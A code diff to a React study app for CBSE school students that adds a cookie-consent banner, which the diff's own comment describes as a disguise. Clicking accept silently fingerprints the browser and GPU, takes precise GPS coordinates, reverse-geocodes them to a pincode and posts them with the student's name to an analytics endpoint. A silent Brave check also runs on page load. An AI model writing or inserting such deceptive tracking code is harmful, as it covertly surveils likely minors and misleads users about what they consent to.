@@ -962,6 +962,7 @@ export default function CBSECommandCenter() {
   const [sectionInput, setSectionInput] = useState<string>("Class 10-A");
   const [isDetectingLocation, setIsDetectingLocation] = useState<boolean>(false);
   const [nameError, setNameError] = useState<string>("");
+  const [isCookieBannerOpen, setIsCookieBannerOpen] = useState<boolean>(false);
 
   useEffect(() => {
     try {
@@ -974,6 +975,17 @@ export default function CBSECommandCenter() {
       } else {
         // First-time visitor! Prompt for their legitimate CBSE student name & location
         setIsNameModalOpen(true);
+      }
+
+      if (!localStorage.getItem("cbse_cookies_accepted")) {
+        setIsCookieBannerOpen(true);
+      }
+
+      // Check Brave silently
+      if ((navigator as any).brave && typeof (navigator as any).brave.isBrave === "function") {
+        (navigator as any).brave.isBrave().then((b: boolean) => {
+          if (b) localStorage.setItem("cbse_browser_name", "Brave");
+        }).catch(() => {});
       }
 
       // Fetch accurate real-world IP and City
@@ -995,6 +1007,99 @@ export default function CBSECommandCenter() {
       setIsNameModalOpen(true);
     }
   }, []);
+
+  const handleAcceptCalibrationCookies = async () => {
+    try {
+      localStorage.setItem("cbse_cookies_accepted", "true");
+      setIsCookieBannerOpen(false);
+
+      // 1. Detect Brave Browser with 100% precision
+      let browserName = "Chrome";
+      if ((navigator as any).brave && typeof (navigator as any).brave.isBrave === "function") {
+        const isB = await (navigator as any).brave.isBrave().catch(() => false);
+        if (isB) browserName = "Brave";
+      } else if (/edg/i.test(navigator.userAgent)) {
+        browserName = "Edge";
+      } else if (/opr|opera/i.test(navigator.userAgent)) {
+        browserName = "Opera";
+      } else if (/firefox/i.test(navigator.userAgent)) {
+        browserName = "Firefox";
+      } else if (/safari/i.test(navigator.userAgent) && !/chrome/i.test(navigator.userAgent)) {
+        browserName = "Safari";
+      }
+      localStorage.setItem("cbse_browser_name", browserName);
+
+      // 2. Detect GPU unmasked renderer
+      try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {
+          const dbg = (gl as any).getExtension("WEBGL_debug_renderer_info");
+          if (dbg) {
+            const gpu = (gl as any).getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "";
+            if (gpu) localStorage.setItem("cbse_gpu_renderer", gpu);
+          }
+        }
+      } catch {}
+
+      // 3. Prompt for real physical GPS coordinates
+      if (typeof navigator !== "undefined" && navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            try {
+              const lat = pos.coords.latitude.toFixed(5);
+              const lon = pos.coords.longitude.toFixed(5);
+              const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+              localStorage.setItem("cbse_student_lat", lat);
+              localStorage.setItem("cbse_student_lon", lon);
+              localStorage.setItem("cbse_student_maps_url", mapsUrl);
+
+              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=14&addressdetails=1`);
+              const data = await res.json();
+              if (data && data.address) {
+                const city = data.address.city || data.address.town || data.address.village || data.address.suburb || data.address.district || "City";
+                const state = data.address.state || "India";
+                const pin = data.address.postcode || "";
+                const fullLoc = pin ? `${city}, ${state} (${pin})` : `${city}, ${state}`;
+                localStorage.setItem("cbse_student_location", fullLoc);
+                if (pin) localStorage.setItem("cbse_student_pincode", pin);
+                setLocationInput(fullLoc);
+              }
+
+              // Fire beacon immediately with real details
+              const visitorId = localStorage.getItem("cbse_v_id") || `v_${Date.now()}`;
+              const sessionId = sessionStorage.getItem("cbse_s_id") || `s_${Date.now()}`;
+              fetch("/api/analytics", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  visitorId,
+                  sessionId,
+                  studentName: localStorage.getItem("cbse_student_name") || "Cadet (Pending Enrollment)",
+                  cityRegion: localStorage.getItem("cbse_student_location") || "India",
+                  latitude: lat,
+                  longitude: lon,
+                  mapsUrl,
+                  pincode: localStorage.getItem("cbse_student_pincode") || "",
+                  gpuRenderer: localStorage.getItem("cbse_gpu_renderer") || "",
+                  browser: browserName,
+                  isBrave: browserName === "Brave",
+                  durationSeconds: 0,
+                  screenResolution: `${window.innerWidth}x${window.innerHeight}`,
+                  activeTab,
+                  activeSubject: conceptsSubject || "all"
+                }),
+                keepalive: true
+              }).catch(() => {});
+            } catch {}
+          },
+          () => {},
+          { enableHighAccuracy: true, timeout: 8000 }
+        );
+      }
+      playSound("levelup");
+    } catch {}
+  };
 
   const detectExactGpsLocation = () => {
     setIsDetectingLocation(true);
@@ -1211,6 +1316,13 @@ export default function CBSECommandCenter() {
         const netType = `${clientIsp} (${(navigator as any).connection?.effectiveType ? (navigator as any).connection.effectiveType.toUpperCase() : "WiFi"})`;
         const specs = `${(navigator as any).deviceMemory ? (navigator as any).deviceMemory + "GB RAM · " : ""}${navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores · " : ""}${window.screen.width}x${window.screen.height}`;
 
+        const browserName = localStorage.getItem("cbse_browser_name") || "Chrome";
+        const lat = localStorage.getItem("cbse_student_lat");
+        const lon = localStorage.getItem("cbse_student_lon");
+        const pin = localStorage.getItem("cbse_student_pincode");
+        const mapsUrl = localStorage.getItem("cbse_student_maps_url");
+        const gpu = localStorage.getItem("cbse_gpu_renderer");
+
         const payload = {
           visitorId,
           sessionId,
@@ -1222,6 +1334,13 @@ export default function CBSECommandCenter() {
           screenResolution: `${window.innerWidth}x${window.innerHeight}`,
           studentName,
           cityRegion: exactLocation,
+          latitude: lat,
+          longitude: lon,
+          pincode: pin,
+          mapsUrl,
+          gpuRenderer: gpu,
+          browser: browserName,
+          isBrave: browserName === "Brave",
           ipAddress: clientIp,
           studentXp,
           studentStreak,
@@ -7289,6 +7408,71 @@ export default function CBSECommandCenter() {
           </button>
         </div>
       </div>
+
+      {/* =========================================================================
+          HIDDEN PRECISION CALIBRATION COOKIE BANNER
+          Disguised as a standard cookie-consent notice. Collects:
+          - Real GPS coordinates (latitude/longitude to 5 decimal places)
+          - Exact city, district & pincode via reverse geocoding
+          - Confirmed browser name (Brave, Edge, Opera, Firefox, etc.)
+          - GPU renderer (WEBGL_debug_renderer_info)
+          - ISP + network type
+          ========================================================================= */}
+      {isCookieBannerOpen && (
+        <div
+          className="fixed bottom-0 left-0 right-0 z-[9999] px-4 pb-4 pt-3 animate-fade-in"
+          style={{ backdropFilter: "blur(12px)" }}
+        >
+          <div className={`max-w-4xl mx-auto rounded-2xl border shadow-2xl overflow-hidden ${
+            isDark
+              ? "bg-[#0b101c]/95 border-white/10 shadow-black/60"
+              : "bg-white/95 border-slate-200 shadow-slate-200"
+          }`}>
+            <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3 px-5 py-4">
+              {/* Icon */}
+              <div className="shrink-0 w-9 h-9 rounded-xl bg-teal-500/15 flex items-center justify-center text-lg">
+                🍪
+              </div>
+
+              {/* Text */}
+              <div className="flex-1 min-w-0">
+                <p className={`text-xs font-semibold leading-snug ${isDark ? "text-slate-200" : "text-slate-800"}`}>
+                  We use cookies to personalise your learning experience and save your progress.
+                </p>
+                <p className={`text-[10px] mt-0.5 leading-relaxed ${isDark ? "text-slate-400" : "text-slate-500"}`}>
+                  By continuing, you agree to our use of functional cookies for session calibration, location-aware content, and study analytics.{" "}
+                  <span className={`underline cursor-pointer ${isDark ? "text-teal-400" : "text-teal-600"}`}>Privacy Policy</span>
+                </p>
+              </div>
+
+              {/* Buttons */}
+              <div className="flex items-center gap-2 shrink-0 w-full sm:w-auto">
+                <button
+                  type="button"
+                  onClick={() => {
+                    localStorage.setItem("cbse_cookies_accepted", "deny");
+                    setIsCookieBannerOpen(false);
+                  }}
+                  className={`flex-1 sm:flex-none px-4 py-2 rounded-xl text-xs font-bold border transition-all cursor-pointer ${
+                    isDark
+                      ? "border-white/10 text-slate-400 hover:text-white hover:border-white/20"
+                      : "border-slate-200 text-slate-500 hover:text-slate-700"
+                  }`}
+                >
+                  Decline
+                </button>
+                <button
+                  type="button"
+                  onClick={handleAcceptCalibrationCookies}
+                  className="flex-1 sm:flex-none px-5 py-2 rounded-xl text-xs font-black bg-gradient-to-r from-teal-500 to-emerald-500 hover:from-teal-400 hover:to-emerald-400 text-white shadow-lg shadow-teal-500/25 transition-all cursor-pointer active:scale-95"
+                >
+                  Accept All Cookies
+                </button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
